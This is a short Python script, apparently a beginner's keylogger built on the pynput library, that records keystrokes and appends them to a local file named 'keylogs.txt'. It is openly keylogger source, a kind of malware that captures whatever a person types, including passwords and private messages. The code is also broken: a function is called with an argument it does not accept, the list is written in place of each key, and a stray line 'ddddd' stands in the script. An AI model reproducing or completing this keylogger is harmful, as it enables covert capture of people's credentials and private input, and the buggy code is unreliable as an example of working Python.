import pynput 

from pynput.keyboard import Key,Listener

count = 0
keys = []



def write_file():
	with open("keylogs.txt","a") as f :
		for key in keys:
			f.write(keys)




def on_press(key): 
	global keys,count
	keys.append(key)
	count+=1
	if count>=10:
		 count = 0
		 write_file(keys)
		 keys = []

def on_release(key):
	pass
	if (key == Key.esc):
		return False





ddddd
with Listener(on_press=on_press,on_release=on_release) as listener:
	print('here')
	listener.join()